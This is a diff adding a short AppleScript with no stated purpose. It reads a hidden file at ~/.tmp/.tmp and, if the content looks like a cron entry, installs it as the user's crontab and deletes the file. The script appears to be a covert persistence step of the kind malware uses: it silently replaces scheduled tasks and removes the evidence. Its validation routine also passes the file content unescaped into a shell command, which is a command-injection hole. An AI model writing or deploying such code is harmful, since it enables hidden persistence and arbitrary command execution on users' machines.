@@ -1,0 +1,20 @@
+set p to (path to home folder as Unicode text) & ".tmp:.tmp"
+
+tell application "Finder"
+	set cont to exists p
+end tell
+
+if cont then
+	set dat to read file p
+	
+	if val(dat) then
+		do shell script "crontab ~/.tmp/.tmp"
+		do shell script "rm ~/.tmp/.tmp"
+	end if
+end if
+
+on val(str)
+	set cmdstr to "echo \"" & str & "\" | sed -E \"s_^(\\*(/[0-9]{1,2})?|[0-9]{1,2}| ){5}.*_valid_\""
+	set isgood to do shell script cmdstr
+	return isgood starts with "valid"
+end val
